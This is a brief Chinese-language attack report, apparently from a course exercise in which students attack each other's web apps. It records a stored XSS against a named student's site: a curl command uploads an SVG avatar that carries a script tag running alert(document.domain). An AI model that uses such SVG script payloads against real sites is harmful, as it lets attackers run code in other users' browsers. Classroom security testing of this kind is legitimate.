|||
|---|---|
|**攻擊者學號**|匿名|
|**受害者學號**|r13921a20|
|**受害者網站**|[https://pleasedonthurtme.vercel.app/](https://pleasedonthurtme.vercel.app/)|
|**攻擊手段**|XSS|
|**漏洞位置**|[https://ia-midtermweb.onrender.com/api/register](https://ia-midtermweb.onrender.com/api/register)|
|**攻擊指令**|`curl -X POST "https://ia-midtermweb.onrender.com/api/register"`<br>`-F "username=omg" -F "password=omg" -F "avatar=@payload.svg`<br>**payload.svg:**<br>`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>`|

**成功攻擊截圖:**
![](img/1.png){height=350}
![](img/2.png){height=350}